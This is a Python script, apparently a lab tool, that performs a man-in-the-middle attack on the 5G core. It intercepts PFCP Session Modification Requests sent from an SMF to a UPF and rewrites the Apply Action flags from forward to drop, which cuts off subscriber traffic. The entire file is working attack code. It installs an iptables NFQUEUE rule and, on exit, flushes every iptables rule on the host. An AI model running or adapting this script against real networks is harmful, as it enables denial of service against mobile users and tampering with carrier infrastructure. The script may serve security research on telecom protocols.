#!/usr/bin/env python3
import os
from scapy.all import IP, UDP, Raw
from netfilterqueue import NetfilterQueue

# --- Configuration ---
SMF_IP = "192.168.37.140"
UPF_IP = "192.168.37.143"

# PFCP Message and IE Types
PFCP_SESSION_MODIFICATION_REQ = 52
IE_UPDATE_FAR = 10
IE_APPLY_ACTION = 44

def find_and_modify_apply_action(payload):
    """
    Parses a PFCP payload to find and modify the Apply Action IE.
    Returns the modified payload or None if no modification was made.
    """
    modified_payload = bytearray(payload)
    
    # PFCP header is 16 bytes when SEID is present
    offset = 16
    
    while offset < len(modified_payload):
        try:
            ie_type = int.from_bytes(modified_payload[offset:offset+2], 'big')
            ie_length = int.from_bytes(modified_payload[offset+2:offset+4], 'big')
            ie_end = offset + 4 + ie_length
        except IndexError:
            break # Malformed packet, stop parsing

        if ie_type == IE_UPDATE_FAR:
            print(f"    [+] Found 'Update FAR' IE at offset {offset}.")
            
            # Search for 'Apply Action' inside the 'Update FAR' grouped IE.
            # Nested IEs start after the FAR's own header (4 bytes) and its content (e.g., FAR ID).
            nested_offset = offset + 4 # Start looking for nested IEs
            while nested_offset < ie_end:
                try:
                    nested_ie_type = int.from_bytes(modified_payload[nested_offset:nested_offset+2], 'big')
                    nested_ie_length = int.from_bytes(modified_payload[nested_offset+2:nested_offset+4], 'big')
                except IndexError:
                    break

                if nested_ie_type == IE_APPLY_ACTION:
                    print(f"        [+] Found 'Apply Action' IE at nested offset {nested_offset}.")
                    
                    action_flags_offset = nested_offset + 4 # Flags are after type/length
                    original_flags = modified_payload[action_flags_offset]
                    
                    if original_flags & 0b10: # Check if the FORW flag is set
                        new_flags = 1  # Set to DROP
                        modified_payload[action_flags_offset] = new_flags
                        
                        print(f"        [!] Modified Action Flags from {bin(original_flags)} to {bin(new_flags)} (DROP).")
                        return bytes(modified_payload) # Return the modified payload
                
                nested_offset += 4 + nested_ie_length
        
        offset = ie_end
        
    return None # Return None if no modification was made

def process_packet(packet):
    """
    This function is called for each packet intercepted by the NetfilterQueue.
    """
    try:
        scp_pkt = IP(packet.get_payload())

        if (scp_pkt.haslayer(UDP) and scp_pkt[UDP].dport == 8805 and
                scp_pkt.src == SMF_IP and scp_pkt.dst == UPF_IP):

            payload = scp_pkt[Raw].load
            message_type = payload[1]

            if message_type == PFCP_SESSION_MODIFICATION_REQ:
                print(f"[*] Intercepted PFCP Session Modification Request from {SMF_IP} to {UPF_IP}!")
                
                modified_payload = find_and_modify_apply_action(payload)
                
                if modified_payload:
                    scp_pkt[Raw].load = modified_payload
                    del scp_pkt[IP].len, scp_pkt[IP].chksum, scp_pkt[UDP].len, scp_pkt[UDP].chksum
                    packet.set_payload(bytes(scp_pkt))
                    print("[+] Forwarding MODIFIED packet to UPF.")
                else:
                    print("[-] No applicable 'Apply Action' IE found to modify. Forwarding original packet.")

    except Exception as e:
        print(f"[!] Error processing packet: {e}")

    packet.accept()

# --- Main execution ---
if __name__ == "__main__":
    QUEUE_NUM = 1
    iptables_rule = f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}"
    print(f"[+] Setting up iptables rule: {iptables_rule}")
    os.system(iptables_rule)

    nfqueue = NetfilterQueue()
    nfqueue.bind(QUEUE_NUM, process_packet)
    
    try:
        print("[+] Starting MITM packet processor. Waiting for PFCP traffic...")
        print("[+] To trigger, connect a UE.")
        print("[!] Press CTRL+C to stop and clean up.")
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[-] Stopping processor and cleaning up iptables rule...")
        os.system("sudo iptables --flush")
        nfqueue.unbind()
        print("[-] Cleanup complete.")
